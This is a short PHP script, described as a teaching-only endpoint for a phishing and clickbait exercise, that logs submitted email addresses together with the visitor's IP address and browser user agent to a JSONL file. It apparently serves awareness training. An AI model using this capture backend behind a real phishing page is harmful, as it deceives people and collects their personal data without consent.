<?php
// C_collect.php — teaching-only endpoint for storing clickbait/phishing captures (JSONL format)
// Appends records into ../Data/clickbait.jsonl (creates directory if missing)

header('Content-Type: application/json; charset=UTF-8');

$email = isset($_POST['email']) ? trim($_POST['email']) : '';
$ok = false; 
$writeOk = false;

if ($email !== '' && filter_var($email, FILTER_VALIDATE_EMAIL)) {
  $ok = true;

  // Build one record with minimal fields for teaching logs
  $rec = [
    'ts'    => gmdate('c'),                       // Timestamp (UTC, ISO 8601)
    'email' => $email,                            // Captured email
    'track' => 'clickbait_phish',                 // Tag to identify scenario
    'ip'    => $_SERVER['REMOTE_ADDR'] ?? '',     // Client IP
    'ua'    => $_SERVER['HTTP_USER_AGENT'] ?? ''  // Browser user agent
  ];

  // Target storage file: ../Data/clickbait.jsonl
  $dir = __DIR__ . '/../Data';
  $file = $dir . '/clickbait.jsonl';

  // Ensure the Data directory exists (create if necessary)
  if (!is_dir($dir)) {
    @mkdir($dir, 0775, true);
  }

  // Append the record (JSON Lines: one JSON object per line)
  $line = json_encode($rec, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . PHP_EOL;
  $fp = @fopen($file, 'ab');
  if ($fp) {
    if (@flock($fp, LOCK_EX)) {                   // Exclusive lock for safe concurrent writes
      $writeOk = (fwrite($fp, $line) !== false);
      @flock($fp, LOCK_UN);
    }
    @fclose($fp);
  }
}

// Respond with a minimal JSON confirmation for the teaching panel
// ok = email was valid, writeOk = record was actually appended
echo json_encode(['ok' => $ok, 'writeOk' => $writeOk], JSON_UNESCAPED_UNICODE);
